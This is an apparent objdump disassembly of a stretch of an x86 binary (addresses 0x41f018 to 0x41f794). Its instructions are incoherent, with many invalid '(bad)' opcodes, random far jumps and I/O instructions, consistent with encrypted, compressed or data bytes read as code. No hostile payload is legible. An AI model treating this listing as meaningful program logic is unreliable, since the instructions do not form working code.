  41f018:	test   DWORD PTR [edx],edx
  41f01a:	dec    edx
  41f01b:	pop    ebx
  41f01c:	(bad)  
  41f01d:	sub    BYTE PTR [eax],al
  41f01f:	mov    esp,0xcf35a264
  41f024:	jge    0x41f0a0
  41f026:	(bad)  
  41f027:	sti    
  41f028:	cmp    DWORD PTR [ebp-0x65608224],0x0
  41f02f:	dec    DWORD PTR [edi-0x6c]
  41f032:	arpl   si,bx
  41f034:	mov    eax,0xa83b3bd8
  41f039:	arpl   cx,dx
  41f03b:	fs test al,0xc5
  41f03e:	dec    edx
  41f03f:	cli    
  41f040:	ds pop eax
  41f042:	mov    esp,0xe71463d1
  41f047:	dec    edx
  41f048:	dec    ecx
  41f049:	inc    ebx
  41f04a:	or     DWORD PTR [ecx],0x703c0555
  41f050:	fisttp QWORD PTR [edi]
  41f052:	jp     0x41f07f
  41f054:	arpl   WORD PTR [eax+0x9],sp
  41f057:	jo     0x41eff4
  41f059:	and    al,0x20
  41f05b:	xchg   edx,eax
  41f05c:	adc    DWORD PTR [edx-0x6af04bd2],0xcc0f9e97
  41f066:	imul   esp,DWORD PTR [ecx+eiz*2],0x8f818192
  41f06d:	arpl   di,si
  41f06f:	gs loop 0x41f0d8
  41f072:	or     dh,BYTE PTR [ebp+0x7c0a214]
  41f078:	mov    esp,0x3810f7e
  41f07d:	out    dx,al
  41f07e:	fmul   DWORD PTR [ebx+0x34ca6cba]
  41f084:	cmp    esi,ecx
  41f086:	dec    ebx
  41f087:	adc    ch,cl
  41f089:	jl     0x41f04c
  41f08b:	dec    esi
  41f08c:	out    0xf4,eax
  41f08e:	scas   eax,DWORD PTR es:[edi]
  41f08f:	es push ecx
  41f091:	jp     0x41f10a
  41f093:	sahf   
  41f094:	sbb    eax,edx
  41f096:	popf   
  41f097:	jnp    0x41f0db
  41f099:	fwait
  41f09a:	test   DWORD PTR [edx],ebp
  41f09c:	push   cs
  41f09d:	sbb    BYTE PTR [edx+ebp*1+0x39],0xb3
  41f0a2:	mov    esp,0x3671bf76
  41f0a7:	pop    esi
  41f0a8:	cmp    eax,0x714790d4
  41f0ad:	lock add bh,BYTE PTR [ebp+ebx*1+0x3e82d742]
  41f0b5:	pop    ecx
  41f0b6:	sti    
  41f0b7:	mov    ebp,0x5d0f3519
  41f0bc:	xor    DWORD PTR [esi+0x622c67cf],ecx
  41f0c2:	jo     0x41f100
  41f0c4:	inc    edi
  41f0c5:	ret    0xb08d
  41f0c8:	pusha  
  41f0c9:	nop
  41f0ca:	and    al,0x15
  41f0cc:	xchg   edi,eax
  41f0cd:	jb     0x41f05e
  41f0cf:	pushf  
  41f0d0:	fwait
  41f0d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0d2:	sbb    BYTE PTR [ebx-0x6a08891a],bl
  41f0d8:	pop    eax
  41f0d9:	fcmovb st,st(4)
  41f0db:	(bad)  
  41f0dc:	pushf  
  41f0dd:	dec    ecx
  41f0de:	loop   0x41f08c
  41f0e0:	add    DWORD PTR [edi],0xcbf34c5d
  41f0e6:	ds ja  0x41f10f
  41f0e9:	sub    ebx,DWORD PTR [ebp+0xd72e40a]
  41f0ef:	mov    ah,0x3d
  41f0f1:	mov    ebp,0xcaa205c5
  41f0f6:	mov    esi,0x3b51442e
  41f0fb:	mov    esi,0x7a72f2b
  41f100:	loopne 0x41f117
  41f102:	call   0x7bdc:0x6977a89a
  41f109:	in     al,dx
  41f10a:	mov    esp,0x4b5961b5
  41f10f:	and    BYTE PTR [esi-0x78477f96],ah
  41f115:	aam    0xd4
  41f117:	jg     0x41f15f
  41f119:	xchg   BYTE PTR [eax*8-0x7739ab4b],ch
  41f120:	xchg   esp,eax
  41f121:	les    eax,FWORD PTR [edi+0x27]
  41f124:	outs   dx,DWORD PTR ds:[esi]
  41f125:	add    dh,BYTE PTR [eax+0x78]
  41f128:	push   cs
  41f129:	stc    
  41f12a:	sar    BYTE PTR [esi-0x2a],1
  41f12d:	cmc    
  41f12e:	xchg   esp,eax
  41f12f:	fdivr  QWORD PTR [esi-0x184446fc]
  41f135:	xor    dh,dh
  41f137:	dec    edx
  41f138:	aad    0x52
  41f13a:	ja     0x41f0ef
  41f13c:	js     0x41f0e8
  41f13e:	sti    
  41f13f:	pop    ss
  41f140:	or     BYTE PTR [edx+0x4406a1ca],ah
  41f146:	jmp    0xcb09:0xc4b2a169
  41f14d:	addr16 jne 0x41f1ce
  41f150:	popf   
  41f151:	stc    
  41f152:	add    eax,0x59bc2ea4
  41f157:	push   ss
  41f158:	int3   
  41f159:	add    bh,BYTE PTR [edi]
  41f15b:	fdiv   st(0),st
  41f15d:	bound  esp,QWORD PTR [edx+ebp*1+0x66]
  41f161:	xchg   esi,eax
  41f162:	mov    esp,0x7fd702af
  41f167:	cmp    edi,DWORD PTR [edi-0x5f]
  41f16a:	(bad)  
  41f16b:	and    al,0x62
  41f16d:	adc    cl,BYTE PTR [edx+0x10]
  41f170:	mov    dh,0x78
  41f172:	jle    0x41f12b
  41f174:	outs   dx,DWORD PTR ds:[esi]
  41f175:	cmp    eax,0x33c21c8
  41f17a:	cld    
  41f17b:	jns    0x41f1a3
  41f17d:	mov    ebx,0xb98a93d0
  41f182:	mov    esi,0xeb6ac261
  41f187:	mov    ebx,0xab10dabc
  41f18c:	sbb    esi,esp
  41f18e:	out    0xdb,eax
  41f190:	sub    ah,BYTE PTR [ebx]
  41f192:	mov    ?,WORD PTR [ecx]
  41f194:	call   0x66a33c99
  41f199:	out    dx,eax
  41f19a:	mov    ebp,0xcdcfef86
  41f19f:	test   eax,0x6d4a98fc
  41f1a4:	clc    
  41f1a5:	push   ds
  41f1a6:	sub    al,0xe5
  41f1a8:	pushf  
  41f1a9:	push   esi
  41f1aa:	xchg   edx,eax
  41f1ab:	outs   dx,BYTE PTR ds:[esi]
  41f1ac:	pop    esp
  41f1ad:	add    DWORD PTR [ebx],0xffffffd7
  41f1b0:	mov    ebp,0x80c76290
  41f1b5:	loopne 0x41f1fd
  41f1b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1b8:	int    0xbf
  41f1ba:	cdq    
  41f1bb:	and    ebp,edx
  41f1bd:	pusha  
  41f1be:	push   esp
  41f1bf:	mov    edi,0xd739d00e
  41f1c4:	test   DWORD PTR [ecx],0xc1968c64
  41f1ca:	or     DWORD PTR [esi+0x72],ebx
  41f1cd:	pushf  
  41f1ce:	sub    BYTE PTR [ecx],bl
  41f1d0:	pop    ecx
  41f1d1:	(bad)  
  41f1d2:	mov    ebp,0x3a10d95
  41f1d7:	cwde   
  41f1d8:	je     0x41f1f8
  41f1da:	pop    esp
  41f1db:	sub    eax,0x8f22ca5d
  41f1e0:	jecxz  0x41f232
  41f1e2:	and    ch,BYTE PTR [ebx-0x11]
  41f1e5:	pop    eax
  41f1e6:	mov    ds:0xb338f17d,eax
  41f1eb:	or     DWORD PTR [ecx],esi
  41f1ed:	adc    edi,edx
  41f1ef:	retf   0x42e4
  41f1f2:	rcl    DWORD PTR [eax+0x32429edb],cl
  41f1f8:	pop    edx
  41f1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1fa:	adc    DWORD PTR [edi],eax
  41f1fc:	cdq    
  41f1fd:	and    ecx,DWORD PTR [esi-0xe]
  41f200:	cmc    
  41f201:	jmp    0x41f1e7
  41f203:	add    eax,ebp
  41f205:	pop    ecx
  41f206:	fcmovnu st,st(5)
  41f208:	clc    
  41f209:	xor    al,0x67
  41f20b:	pop    eax
  41f20c:	ds shl ebp,1
  41f20f:	fs mov ah,0x5d
  41f212:	in     al,dx
  41f213:	xchg   ecx,eax
  41f214:	sti    
  41f215:	sub    al,0xc6
  41f217:	jle    0x41f1aa
  41f219:	shl    ch,cl
  41f21b:	retf   
  41f21c:	popf   
  41f21d:	and    eax,0x58cedb40
  41f222:	cli    
  41f223:	adc    bh,dh
  41f225:	jns    0x41f1ec
  41f227:	fs repnz test eax,0xe6c243e6
  41f22e:	lods   eax,DWORD PTR ds:[esi]
  41f22f:	push   edx
  41f230:	mov    BYTE PTR ds:0xb4d437c3,ah
  41f236:	mov    ds:0x7aba70dd,al
  41f23b:	xchg   edx,eax
  41f23c:	mov    esp,0x41f1eeec
  41f241:	xor    bh,BYTE PTR [edx+0x71]
  41f244:	add    DWORD PTR fs:[edi],esi
  41f247:	mov    ch,0xdc
  41f249:	arpl   WORD PTR [ecx+0x6c9c9b9f],si
  41f24f:	jecxz  0x41f2ce
  41f251:	dec    eax
  41f252:	aas    
  41f253:	or     BYTE PTR [ecx-0x3ef6e241],bh
  41f259:	mov    ch,0x13
  41f25b:	xchg   edx,eax
  41f25c:	out    0x23,al
  41f25e:	shl    DWORD PTR [ebx+ebp*2+0x1f8cf762],cl
  41f265:	and    DWORD PTR [esi-0x5df6a99b],edi
  41f26b:	outs   dx,BYTE PTR ds:[esi]
  41f26c:	xchg   DWORD PTR [edx-0x31b90756],esp
  41f272:	sbb    eax,ebp
  41f274:	loope  0x41f2f3
  41f276:	pushf  
  41f277:	push   cs
  41f278:	ins    BYTE PTR es:[edi],dx
  41f279:	jmp    0xf9bf858e
  41f27e:	repz (bad) 
  41f281:	or     BYTE PTR [esi+0xf],cl
  41f284:	ins    DWORD PTR es:[edi],dx
  41f285:	fld    QWORD PTR [edx+edx*4+0x29]
  41f289:	mov    dh,0x51
  41f28b:	out    dx,eax
  41f28c:	pop    esi
  41f28d:	jecxz  0x41f2c0
  41f28f:	mov    esi,0x5d3779f4
  41f294:	xchg   BYTE PTR [esi+0x29],bh
  41f297:	sahf   
  41f298:	mov    ch,0xd0
  41f29a:	stos   BYTE PTR es:[edi],al
  41f29b:	add    eax,0xbb6ad28a
  41f2a0:	scas   al,BYTE PTR es:[edi]
  41f2a1:	and    BYTE PTR [esi-0x51],cl
  41f2a4:	xor    eax,0x7348ae83
  41f2a9:	jae    0x41f290
  41f2ab:	aad    0xa9
  41f2ad:	div    ebx
  41f2af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f2b0:	xchg   edx,eax
  41f2b1:	mov    ds:0xf943ab62,al
  41f2b6:	stos   DWORD PTR es:[edi],eax
  41f2b7:	pop    ebx
  41f2b8:	je     0x41f306
  41f2ba:	ret    0xe099
  41f2bd:	std    
  41f2be:	jmp    0x778591dc
  41f2c3:	fs push ds
  41f2c5:	push   es
  41f2c6:	mov    ah,BYTE PTR [esi-0x7f02e2a0]
  41f2cc:	ret    0xbb97
  41f2cf:	in     eax,0x28
  41f2d1:	cmp    al,0xea
  41f2d3:	xor    eax,0x133b1e83
  41f2d8:	neg    DWORD PTR [edx-0xe069ab2]
  41f2de:	fcomi  st,st(3)
  41f2e0:	adc    DWORD PTR [esi-0x4b],edx
  41f2e3:	(bad)  
  41f2e4:	js     0x41f32e
  41f2e6:	push   ecx
  41f2e7:	xor    ebx,ebp
  41f2e9:	mov    BYTE PTR [ecx+esi*8-0x4f],al
  41f2ed:	scas   al,BYTE PTR es:[edi]
  41f2ee:	call   0x5cd5:0x6b2ee04e
  41f2f5:	mov    ebp,0xa27b6616
  41f2fa:	lock add BYTE PTR [ecx+0x64],bh
  41f2fe:	fdiv   DWORD PTR [eax-0x37]
  41f301:	cmp    al,0xc3
  41f303:	das    
  41f304:	push   es
  41f305:	mov    ah,0x40
  41f307:	pushf  
  41f308:	mov    edx,0x306ecd3a
  41f30d:	xor    BYTE PTR [esi+0x16],0x34
  41f311:	je     0x41f31a
  41f313:	jne    0x41f2ef
  41f315:	jae    0x41f2e8
  41f317:	pop    ebx
  41f318:	retf   0xd316
  41f31b:	push   edx
  41f31c:	scas   al,BYTE PTR es:[edi]
  41f31d:	mov    DWORD PTR [eax+0x6e],ebx
  41f320:	inc    ebx
  41f321:	xchg   edi,eax
  41f322:	popf   
  41f323:	inc    ecx
  41f324:	pop    ebp
  41f325:	pop    esi
  41f326:	jmp    0x2fbf3f53
  41f32b:	dec    esp
  41f32c:	cmp    eax,0x70c2e43a
  41f331:	fwait
  41f332:	jnp    0x41f340
  41f334:	loop   0x41f2dd
  41f336:	ror    BYTE PTR [edi],1
  41f338:	jb     0x41f32c
  41f33a:	jbe    0x41f33c
  41f33c:	cmp    eax,0x1ad0ef5d
  41f341:	xchg   ecx,eax
  41f342:	lods   al,BYTE PTR ds:[esi]
  41f343:	sbb    ecx,DWORD PTR [ecx-0x2b]
  41f346:	iret   
  41f347:	adc    DWORD PTR [eax],0xde0d2f07
  41f34d:	jl     0x41f2e9
  41f34f:	jmp    0xdb4e781
  41f354:	adc    BYTE PTR [esi+ecx*4+0x59],dh
  41f358:	push   0xfffffff1
  41f35a:	in     al,0x2a
  41f35c:	shl    BYTE PTR [ecx-0x3e17311f],cl
  41f362:	cmp    DWORD PTR [eax],ecx
  41f364:	sub    al,0xb8
  41f366:	cmp    BYTE PTR [eax+ebp*2+0x40],dl
  41f36a:	in     al,dx
  41f36b:	jmp    0x2dcf5c02
  41f370:	cwde   
  41f371:	sub    al,0xa0
  41f373:	pop    edi
  41f374:	(bad)  
  41f375:	jno    0x41f3e9
  41f377:	int3   
  41f378:	cmp    BYTE PTR [edx+ebp*4],al
  41f37b:	inc    ebx
  41f37c:	cld    
  41f37d:	int3   
  41f37e:	sub    edx,DWORD PTR ds:[esi-0x39]
  41f382:	sub    ch,BYTE PTR [esi]
  41f384:	int    0x7a
  41f386:	or     ah,BYTE PTR [esi+0x5b5f0866]
  41f38c:	popf   
  41f38d:	(bad)  
  41f38f:	inc    ecx
  41f390:	out    0xf2,al
  41f392:	sahf   
  41f393:	lds    esi,FWORD PTR [esi-0x3b]
  41f396:	jnp    0x41f358
  41f398:	jno    0x41f35f
  41f39a:	mov    al,0xde
  41f39c:	sti    
  41f39d:	in     eax,0x33
  41f39f:	ins    BYTE PTR es:[edi],dx
  41f3a0:	add    bh,0x77
  41f3a3:	xchg   ebx,eax
  41f3a4:	xchg   BYTE PTR [eax+0x6c],ah
  41f3a7:	je     0x41f383
  41f3a9:	mov    BYTE PTR [ecx+eax*2-0x79],cl
  41f3ad:	daa    
  41f3ae:	jp     0x41f331
  41f3b0:	stos   BYTE PTR es:[edi],al
  41f3b1:	lds    ecx,FWORD PTR [ecx+0x175f6157]
  41f3b7:	mov    dl,0x48
  41f3b9:	jle    0x41f3ab
  41f3bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f3bc:	xchg   esi,eax
  41f3bd:	or     BYTE PTR [ebp+edx*8-0x6b],al
  41f3c1:	sbb    DWORD PTR [eax-0x42d6c8fe],edx
  41f3c7:	push   0xc83b9699
  41f3cc:	ins    BYTE PTR es:[edi],dx
  41f3cd:	pop    edi
  41f3ce:	xor    BYTE PTR [eax],bh
  41f3d0:	cmp    ebx,DWORD PTR [edi+0x23]
  41f3d3:	shl    DWORD PTR [eax+0x24],1
  41f3d6:	call   0x54af9636
  41f3db:	push   esp
  41f3dc:	test   dh,ah
  41f3de:	das    
  41f3df:	jno    0x41f3fb
  41f3e1:	adc    DWORD PTR [ebp-0x77],ebp
  41f3e4:	or     ebx,0xfffffff6
  41f3e7:	sbb    al,0xdd
  41f3e9:	mov    eax,cs:0xa1dd0dec
  41f3ef:	adc    ah,BYTE PTR [edx]
  41f3f1:	pop    edi
  41f3f2:	lahf   
  41f3f3:	push   edx
  41f3f4:	add    BYTE PTR [esi],dh
  41f3f6:	mov    dl,0xfd
  41f3f8:	out    0xe2,al
  41f3fa:	sub    eax,0xb25e6860
  41f3ff:	call   0xbee93e5b
  41f404:	aad    0x23
  41f406:	pop    ebp
  41f407:	in     eax,dx
  41f408:	sbb    BYTE PTR [bx+di+0x700a],ah
  41f40d:	stos   DWORD PTR es:[edi],eax
  41f40e:	out    0x72,al
  41f410:	das    
  41f411:	in     eax,dx
  41f412:	and    al,0x3d
  41f414:	cmp    DWORD PTR [ecx],0x51
  41f417:	(bad)  
  41f418:	ins    BYTE PTR es:[edi],dx
  41f419:	xor    BYTE PTR [edx+0x12],bl
  41f41c:	iret   
  41f41d:	jns    0x41f3e6
  41f41f:	and    eax,0x37056e4b
  41f424:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f425:	js     0x41f41c
  41f427:	xlat   BYTE PTR ds:[ebx]
  41f428:	lahf   
  41f429:	cmp    bh,BYTE PTR [esi]
  41f42b:	push   es
  41f42c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f42d:	mov    ebp,0xb146592e
  41f432:	inc    esi
  41f433:	daa    
  41f434:	retf   
  41f435:	ficom  WORD PTR [edi-0x51]
  41f438:	mov    edx,0x70750e78
  41f43d:	push   0xb14f5018
  41f442:	mov    eax,ds:0xdb4aab26
  41f447:	lock mov ds:0x601af1ca,al
  41f44d:	mov    dh,0xa0
  41f44f:	ins    BYTE PTR es:[edi],dx
  41f450:	and    BYTE PTR [ebp+0x7278d25a],dh
  41f456:	inc    esp
  41f457:	scas   eax,DWORD PTR es:[edi]
  41f458:	add    DWORD PTR [ecx+0x1b737350],ebx
  41f45e:	pop    edx
  41f45f:	shr    BYTE PTR [ecx+0x3c46372],1
  41f465:	iret   
  41f466:	mov    ds:0xc1f66e28,eax
  41f46b:	mov    al,ds:0x6b655684
  41f470:	inc    edi
  41f471:	xor    al,0xe0
  41f473:	rcr    BYTE PTR [edi-0x33],0x51
  41f477:	push   edi
  41f478:	ror    DWORD PTR ds:0x8ffcf3c8,0x37
  41f47f:	or     eax,0xc7ec3431
  41f484:	jnp    0x41f4ae
  41f486:	stos   DWORD PTR es:[edi],eax
  41f487:	xchg   edi,eax
  41f488:	gs xor ebx,edi
  41f48b:	retf   0x54c4
  41f48e:	(bad)  
  41f490:	hlt    
  41f491:	xchg   DWORD PTR [ecx-0x79],eax
  41f494:	dec    esp
  41f495:	jle    0x41f44f
  41f497:	lahf   
  41f498:	sbb    DWORD PTR [si],esi
  41f49b:	jb     0x41f461
  41f49d:	ret    0xa523
  41f4a0:	inc    ebx
  41f4a1:	inc    eax
  41f4a2:	inc    ebp
  41f4a3:	xchg   ebp,eax
  41f4a4:	mov    dh,0x37
  41f4a6:	mov    dh,0x5b
  41f4a8:	dec    edi
  41f4a9:	test   DWORD PTR [eax+0x2e912132],eax
  41f4af:	stos   BYTE PTR es:[edi],al
  41f4b0:	pop    esp
  41f4b1:	ds cdq 
  41f4b3:	(bad)  [edi-0x5b]
  41f4b6:	and    BYTE PTR [eax+0x64ee0cce],al
  41f4bc:	push   ecx
  41f4bd:	daa    
  41f4be:	repnz mov ch,0xc5
  41f4c1:	pushf  
  41f4c2:	mov    cl,BYTE PTR [edx-0x73643dd4]
  41f4c8:	cmp    al,0x68
  41f4ca:	xor    ah,0x35
  41f4cd:	dec    edx
  41f4ce:	push   edi
  41f4cf:	fwait
  41f4d0:	xlat   BYTE PTR ds:[ebx]
  41f4d1:	jmp    0x41f470
  41f4d3:	aam    0x69
  41f4d5:	int3   
  41f4d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4d7:	xchg   DWORD PTR [edi+0x65],esi
  41f4da:	aam    0x8b
  41f4dc:	push   ss
  41f4dd:	ror    ch,cl
  41f4df:	mov    al,0xa2
  41f4e1:	fmul   DWORD PTR ss:[eax-0x6faa6638]
  41f4e8:	dec    eax
  41f4e9:	loope  0x41f47a
  41f4eb:	inc    edx
  41f4ec:	adc    DWORD PTR [ecx-0x58],esi
  41f4ef:	test   al,0x65
  41f4f1:	xchg   esp,ebx
  41f4f3:	(bad)  
  41f4f5:	inc    ecx
  41f4f6:	in     al,0x58
  41f4f8:	add    eax,0xa2ec734a
  41f4fd:	cmp    BYTE PTR [ebx],dh
  41f4ff:	pop    ds
  41f500:	std    
  41f501:	jmp    0x13e4fc6b
  41f506:	sub    eax,0xc911a2b3
  41f50b:	lock jns 0x41f55f
  41f50e:	iret   
  41f50f:	in     al,dx
  41f510:	pop    ecx
  41f511:	stos   DWORD PTR es:[edi],eax
  41f512:	mov    dh,0x10
  41f514:	push   ebp
  41f515:	jb     0x41f588
  41f517:	pop    esp
  41f518:	shl    eax,1
  41f51a:	dec    edi
  41f51b:	dec    esp
  41f51c:	sub    ah,BYTE PTR [ecx-0x4b]
  41f51f:	xchg   ebx,eax
  41f520:	sahf   
  41f521:	jae    0x41f4bc
  41f523:	mov    eax,0x6e6ad738
  41f528:	jo     0x41f4f2
  41f52a:	aas    
  41f52b:	test   eax,0x87f5c633
  41f530:	icebp  
  41f531:	pushf  
  41f532:	push   cs
  41f533:	ror    BYTE PTR [edx],0x35
  41f536:	ret    
  41f537:	scas   eax,DWORD PTR es:[edi]
  41f538:	fstp   st(6)
  41f53a:	call   0x626:0xd1899de8
  41f541:	push   ecx
  41f542:	push   0x47
  41f544:	mov    ebx,DWORD PTR [eax+0x1e8fdc65]
  41f54a:	mul    DWORD PTR [esi]
  41f54c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f54d:	mov    edi,0x869f05c5
  41f552:	dec    ebx
  41f553:	push   ebx
  41f554:	mov    eax,ds:0x2d711f0
  41f559:	ss adc eax,0x4652afe1
  41f55f:	sbb    eax,0x23f87d35
  41f564:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f565:	loop   0x41f525
  41f567:	jge    0x41f5e3
  41f569:	fiadd  DWORD PTR [esi+0x212729f5]
  41f56f:	ja     0x41f599
  41f571:	cmc    
  41f572:	adc    al,0xf8
  41f574:	mov    esi,0x9ad73b93
  41f579:	xlat   BYTE PTR ds:[ebx]
  41f57a:	push   0xd53ea180
  41f57f:	data16 fwait
  41f581:	sahf   
  41f582:	imul   edx,DWORD PTR [esi+eiz*8-0x5947d5c0],0x7b
  41f58a:	ficomp WORD PTR [edi]
  41f58c:	imul   edi,DWORD PTR [ebp-0x201eda17],0x19
  41f593:	cwde   
  41f594:	data16 or al,0x28
  41f597:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f598:	(bad)  
  41f59a:	xchg   ebp,eax
  41f59b:	mov    eax,DWORD PTR [ebp+eiz*1+0x4c]
  41f59f:	cmp    dh,ch
  41f5a1:	jmp    0x63cd0d9
  41f5a6:	sub    DWORD PTR [esi-0x6eb59309],0x28bad943
  41f5b0:	(bad)
  41f5b3:	xor    DWORD PTR [ecx],0x3f
  41f5b6:	scas   eax,DWORD PTR es:[edi]
  41f5b7:	hlt    
  41f5b8:	dec    edi
  41f5b9:	lock inc ebx
  41f5bb:	mov    eax,0x49ea6e77
  41f5c0:	or     edi,esi
  41f5c2:	fdivr  QWORD PTR [edi]
  41f5c4:	mov    WORD PTR [ecx+0x62],es
  41f5c7:	sbb    al,0xe6
  41f5c9:	pop    ss
  41f5ca:	outs   dx,BYTE PTR ds:[esi]
  41f5cb:	or     edi,DWORD PTR [eax+0x14]
  41f5ce:	fadd   QWORD PTR [ebx-0xa]
  41f5d1:	lea    edx,[ebx+eiz*4-0x763645e7]
  41f5d8:	push   cs
  41f5d9:	inc    esi
  41f5da:	xchg   ebp,eax
  41f5db:	mov    eax,0x212653cb
  41f5e0:	or     DWORD PTR [ebp+0x52286d8e],eax
  41f5e6:	sub    DWORD PTR [eax+0x17],0x69
  41f5ea:	fsubr  DWORD PTR [edi+0xd]
  41f5ed:	ins    DWORD PTR es:[edi],dx
  41f5ee:	push   esi
  41f5ef:	ins    DWORD PTR es:[edi],dx
  41f5f0:	push   cs
  41f5f1:	fnstcw WORD PTR fs:[ecx-0x1d086899]
  41f5f8:	push   esi
  41f5f9:	popf   
  41f5fa:	jl     0x41f585
  41f5fc:	sub    ebx,esp
  41f5fe:	xchg   al,ch
  41f600:	jle    0x41f5fd
  41f602:	gs in  eax,0xeb
  41f605:	mov    edx,0x97b6044b
  41f60a:	jbe    0x41f67e
  41f60c:	or     BYTE PTR ds:0x2c9d19bf,0xe8
  41f613:	lods   al,BYTE PTR ds:[esi]
  41f614:	jecxz  0x41f66f
  41f616:	jecxz  0x41f59e
  41f618:	dec    ebp
  41f619:	dec    esi
  41f61a:	dec    eax
  41f61b:	in     eax,dx
  41f61c:	cmp    ebp,DWORD PTR [esi-0x313e91b8]
  41f622:	adc    DWORD PTR [esi-0x56a76c6b],ebx
  41f628:	scas   al,BYTE PTR es:[edi]
  41f629:	iret   
  41f62a:	push   ss
  41f62b:	add    eax,0x2e2bc6ad
  41f630:	pushf  
  41f631:	dec    ecx
  41f632:	enter  0xaf30,0xc1
  41f636:	mov    es,esi
  41f638:	cmp    eax,0x8556543
  41f63d:	dec    edi
  41f63e:	sub    ebp,esi
  41f640:	popa   
  41f641:	arpl   WORD PTR [eax-0x7c07fad9],bp
  41f647:	cli    
  41f648:	fld    DWORD PTR [edx+0x63]
  41f64b:	imul   esi,DWORD PTR [edx],0x1e
  41f64e:	lods   eax,DWORD PTR ds:[esi]
  41f64f:	cmc    
  41f650:	and    eax,0x5e68825
  41f655:	dec    edx
  41f656:	ss (bad) 
  41f658:	test   BYTE PTR [bx+di-0x706b],dh
  41f65d:	xchg   esp,eax
  41f65e:	retf   0x63f2
  41f661:	pop    es
  41f662:	(bad)
  41f665:	cmp    eax,DWORD PTR [edi]
  41f667:	les    bp,DWORD PTR [edi+0x3442167e]
  41f66e:	std    
  41f66f:	in     al,dx
  41f670:	xlat   BYTE PTR ds:[ebx]
  41f671:	xchg   esp,eax
  41f672:	daa    
  41f673:	fidiv  WORD PTR [edx-0x36]
  41f676:	sub    DWORD PTR [ebx-0x52],ecx
  41f679:	cmp    al,0x7d
  41f67b:	mov    ecx,0xa2e88429
  41f680:	test   BYTE PTR [ecx-0x18a4007d],dl
  41f686:	inc    edi
  41f687:	cdq    
  41f688:	dec    edi
  41f689:	(bad)  [edi-0x6f928ed]
  41f68f:	xlat   BYTE PTR ds:[ebx]
  41f690:	xor    edx,ecx
  41f692:	cmc    
  41f693:	jp     0x41f6cd
  41f695:	and    ch,BYTE PTR [ebx]
  41f697:	and    eax,DWORD PTR [esi]
  41f699:	xchg   edi,eax
  41f69b:	cmp    edi,ebp
  41f69d:	inc    esp
  41f69e:	mov    ah,0xc
  41f6a0:	push   0xffffffdd
  41f6a2:	add    ebx,edi
  41f6a4:	call   0xa6a:0xb5112292
  41f6ab:	in     al,0x2c
  41f6ad:	int    0xd1
  41f6af:	jle    0x41f6fb
  41f6b1:	xchg   dl,bl
  41f6b3:	pop    esp
  41f6b4:	sub    BYTE PTR [esi],bh
  41f6b6:	xchg   ebp,eax
  41f6b7:	inc    BYTE PTR [eax+0x49]
  41f6ba:	push   ds
  41f6bb:	cmp    esp,DWORD PTR [ebp+0x72]
  41f6be:	shl    BYTE PTR [ebx+0x244ac279],1
  41f6c4:	dec    ebx
  41f6c5:	jne    0x41f660
  41f6c7:	sbb    ebp,DWORD PTR [eax]
  41f6c9:	pushw  ds
  41f6cb:	mov    al,0xcd
  41f6cd:	js     0x41f6fd
  41f6cf:	mov    ebx,0x778eec9b
  41f6d4:	or     bh,BYTE PTR [ebx]
  41f6d6:	cmp    al,0xe0
  41f6d8:	adc    al,0xfc
  41f6da:	jnp    0x41f69d
  41f6dc:	(bad)  
  41f6dd:	jle    0x41f73f
  41f6df:	call   0x1ac3:0xb9644292
  41f6e6:	and    DWORD PTR [ecx-0x3f3ecd22],esi
  41f6ec:	aaa    
  41f6ed:	mov    ds,WORD PTR [ebp-0x5d1750ad]
  41f6f3:	push   es
  41f6f4:	repnz popf 
  41f6f6:	mov    dh,0x6a
  41f6f8:	cmp    al,0xb4
  41f6fa:	cmp    al,0x5b
  41f6fc:	psrld  mm3,QWORD PTR [esp+esi*1]
  41f700:	mov    edx,0x8748c7ae
  41f705:	cmc    
  41f706:	push   edi
  41f707:	xchg   edx,eax
  41f708:	daa    
  41f709:	rcl    BYTE PTR [edi-0x38],1
  41f70c:	mov    ds:0xd3e0a0c2,al
  41f711:	das    
  41f712:	cs nop
  41f714:	and    al,0xd6
  41f716:	adc    al,0xf8
  41f718:	jp     0x41f725
  41f71a:	push   esi
  41f71b:	xlat   BYTE PTR ds:[ebx]
  41f71c:	pushf  
  41f71d:	push   edi
  41f71e:	or     ch,BYTE PTR [ecx-0x39]
  41f721:	test   eax,0x208d4abd
  41f726:	cmp    eax,0x6f017701
  41f72b:	and    eax,ebp
  41f72d:	add    DWORD PTR [edx-0x18727c90],eax
  41f733:	jmp    0x6a2afbd9
  41f738:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f739:	retf   0xdc5e
  41f73c:	out    dx,eax
  41f73d:	mov    ah,0x21
  41f73f:	dec    edi
  41f740:	push   edi
  41f741:	push   0xffffffcb
  41f743:	sar    BYTE PTR [ebx+0x3e68f09],1
  41f749:	mov    edi,0x87de6be1
  41f74e:	adc    bh,dh
  41f750:	mov    ebp,DWORD PTR [ebx]
  41f752:	adc    BYTE PTR [esi+0x76],cl
  41f755:	outs   dx,BYTE PTR ds:[esi]
  41f756:	mov    al,ds:0x2d002de5
  41f75b:	mov    DWORD PTR [ecx-0x49bff9c3],edx
  41f761:	inc    eax
  41f762:	and    esi,DWORD PTR [edx+ecx*8+0x50d226df]
  41f769:	or     bl,BYTE PTR [ebp+0x2f]
  41f76c:	jecxz  0x41f71a
  41f76e:	xchg   edi,eax
  41f76f:	mov    ds:0xa74ea50e,al
  41f774:	imul   edi,DWORD PTR [edi-0x4a10fee],0xfffffffb
  41f77b:	das    
  41f77c:	mov    al,ds:0xd916efe4
  41f781:	dec    ecx
  41f782:	lea    eax,[ecx]
  41f784:	shr    dl,cl
  41f786:	fld    DWORD PTR [eax+0x765d1a40]
  41f78c:	test   DWORD PTR [ecx+0x21],esp
  41f78f:	add    BYTE PTR [edi],cl
  41f791:	add    DWORD PTR [ecx],0xffffffdd
  41f794:	jno    0x41f7aa
